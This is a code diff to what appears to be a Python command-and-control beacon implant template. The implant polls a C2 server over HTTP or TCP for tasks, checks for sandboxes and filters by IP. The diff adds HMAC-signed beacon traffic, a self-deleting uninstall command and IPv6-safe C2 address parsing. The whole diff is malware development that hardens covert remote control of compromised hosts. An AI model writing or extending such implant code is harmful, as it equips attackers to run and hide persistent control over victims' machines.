@@ -11,9 +11,12 @@ import time
 import random
 import base64
 import shutil
+import hashlib
+import hmac as hmac_mod
 
 C2_URL = "{{C2_URL}}"
 BEACON_ID = "{{BEACON_ID}}"
+BEACON_KEY = "{{BEACON_KEY}}"
 SLEEP = {{SLEEP}}
 JITTER = {{JITTER}}
 PROTO = "{{PROTO}}"
@@ -153,40 +156,51 @@ def is_sandbox():
 def check_ip_filter():
     if not ALLOWED_IPS and not BLOCKED_IPS:
         return True
-    try:
-        req = urllib.request.Request("http://api.ipify.org")
-        resp = urllib.request.urlopen(req, timeout=5)
-        public_ip = resp.read().decode().strip()
-    except Exception:
-        try:
-            req = urllib.request.Request("http://ifconfig.me/ip")
-            resp = urllib.request.urlopen(req, timeout=5)
-            public_ip = resp.read().decode().strip()
-        except Exception:
-            return True  # fail-open
+    # Local interface addresses only; no third-party IP echo service.
     try:
         import ipaddress
-        ip = ipaddress.ip_address(public_ip)
-        if BLOCKED_IPS:
-            for entry in BLOCKED_IPS.split("|"):
-                entry = entry.strip()
-                if not entry:
-                    continue
-                if "/" in entry:
-                    if ip in ipaddress.ip_network(entry, strict=False):
+        local_ips = set()
+        try:
+            for info in socket.getaddrinfo(socket.gethostname(), None):
+                local_ips.add(info[4][0])
+        except Exception:
+            pass
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ips.add(s.getsockname()[0])
+            s.close()
+        except Exception:
+            pass
+        if not local_ips:
+            return True  # fail-open
+
+        for local_ip in local_ips:
+            try:
+                ip = ipaddress.ip_address(local_ip)
+            except ValueError:
+                continue
+            if BLOCKED_IPS:
+                for entry in BLOCKED_IPS.split("|"):
+                    entry = entry.strip()
+                    if not entry:
+                        continue
+                    if "/" in entry:
+                        if ip in ipaddress.ip_network(entry, strict=False):
+                            return False
+                    elif str(ip) == entry:
                         return False
-                elif str(ip) == entry:
-                    return False
-        if ALLOWED_IPS:
-            for entry in ALLOWED_IPS.split("|"):
-                entry = entry.strip()
-                if not entry:
-                    continue
-                if "/" in entry:
-                    if ip in ipaddress.ip_network(entry, strict=False):
+            if ALLOWED_IPS:
+                for entry in ALLOWED_IPS.split("|"):
+                    entry = entry.strip()
+                    if not entry:
+                        continue
+                    if "/" in entry:
+                        if ip in ipaddress.ip_network(entry, strict=False):
+                            return True
+                    elif str(ip) == entry:
                         return True
-                elif str(ip) == entry:
-                    return True
+        if ALLOWED_IPS:
             return False
     except Exception:
         pass
@@ -587,10 +601,25 @@ def sleep_with_jitter():
 
 # ==================== HTTP MODE ====================
 
+def auth_headers(body_bytes):
+    """HMAC-SHA256 request authentication (C2 beacon protocol)."""
+    ts = str(int(time.time()))
+    nonce = os.urandom(8).hex()
+    mac = hmac_mod.new(BEACON_KEY.encode(), ts.encode() + b"." + nonce.encode() + b"." + body_bytes, hashlib.sha256)
+    return {
+        "X-Beacon-ID": BEACON_ID,
+        "X-Beacon-OS": platform.system() + " " + platform.machine(),
+        "X-Beacon-Timestamp": ts,
+        "X-Beacon-Nonce": nonce,
+        "X-Beacon-Sign": mac.hexdigest(),
+        "Content-Type": "application/json",
+    }
+
+
 def http_post(url, data):
     try:
         body = json.dumps(data).encode()
-        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
+        req = urllib.request.Request(url, data=body, headers=auth_headers(body))
         resp = urllib.request.urlopen(req, timeout=10)
         return resp.read().decode()
     except Exception:
@@ -610,13 +639,8 @@ def http_send_result(task_id, output):
 def http_checkin():
     global SLEEP, JITTER
     try:
-        req = urllib.request.Request(
-            C2_URL + "/checkin?id=" + BEACON_ID,
-            headers={
-                "X-Beacon-ID": BEACON_ID,
-                "X-Beacon-OS": platform.system() + " " + platform.machine(),
-            }
-        )
+        body = json.dumps({"type": "poll"}).encode()
+        req = urllib.request.Request(C2_URL + "/checkin", data=body, headers=auth_headers(body))
         resp = urllib.request.urlopen(req, timeout=10)
         body = resp.read().decode()
 
@@ -636,6 +660,13 @@ def http_checkin():
                 for task in tasks:
                     cmd = task.get("command", "")
                     task_id = task.get("id", "")
+                    if cmd == "__UNINSTALL__":
+                        http_send_result(task_id, "UNINSTALLED")
+                        try:
+                            os.remove(__file__)
+                        except Exception:
+                            pass
+                        os._exit(0)
                     if cmd == "__EXIT__":
                         http_send_result(task_id, "BEACON_TERMINATED")
                         os._exit(0)
@@ -657,7 +688,16 @@ def run_http():
 # ==================== TCP MODE ====================
 
 def tcp_write_msg(sock, msg):
-    """Send length-prefixed JSON message"""
+    """Send length-prefixed JSON message with HMAC signature"""
+    if BEACON_KEY and "sig" not in msg and "type" in msg:
+        data_bytes = json.dumps(msg.get("data", "")).encode() if msg.get("data") is not None else b""
+        ts = int(time.time())
+        nonce = os.urandom(8).hex()
+        mac = hmac_mod.new(BEACON_KEY.encode(), msg["type"].encode() + b"." + str(ts).encode() + b"." + nonce.encode() + b"." + data_bytes, hashlib.sha256)
+        msg = dict(msg)
+        msg["ts"] = ts
+        msg["nonce"] = nonce
+        msg["sig"] = mac.hexdigest()
     data = json.dumps(msg).encode()
     sock.sendall(struct.pack(">I", len(data)) + data)
 
@@ -682,12 +722,23 @@ def tcp_read_msg(sock):
     return json.loads(data.decode())
 
 
+def parse_tcp_target(url):
+    """Parse host:port, handling bracketed IPv6 ([::1]:4444) correctly."""
+    url = url.strip()
+    if "]:" in url:
+        host, port = url.rsplit("]:", 1)
+        host = host.lstrip("[").rstrip("]")
+        return host, int(port) if port.isdigit() else 4444
+    parts = url.rsplit(":", 1)
+    if len(parts) == 2 and parts[1].isdigit() and parts[0].count(":") <= 1:
+        return parts[0], int(parts[1])
+    return url, 4444
+
+
 def run_tcp():
     global SLEEP, JITTER
-    # Parse host:port from C2_URL
-    parts = C2_URL.rsplit(":", 1)
-    host = parts[0]
-    port = int(parts[1]) if len(parts) > 1 else 4444
+    # Parse host:port from C2_URL (IPv6-safe)
+    host, port = parse_tcp_target(C2_URL)
 
     while True:
         try:
@@ -722,6 +773,15 @@ def run_tcp():
                     for task in tasks:
                         cmd = task.get("command", "")
                         task_id = task.get("id", "")
+                        if cmd == "__UNINSTALL__":
+                            tcp_write_msg(sock, {"type": "result", "data": {"task_id": task_id, "output": "UNINSTALLED", "beacon_id": BEACON_ID}})
+                            tcp_read_msg(sock)
+                            try:
+                                os.remove(__file__)
+                            except Exception:
+                                pass
+                            sock.close()
+                            os._exit(0)
                         if cmd == "__EXIT__":
                             tcp_write_msg(sock, {"type": "result", "data": {"task_id": task_id, "output": "BEACON_TERMINATED", "beacon_id": BEACON_ID}})
                             tcp_read_msg(sock)
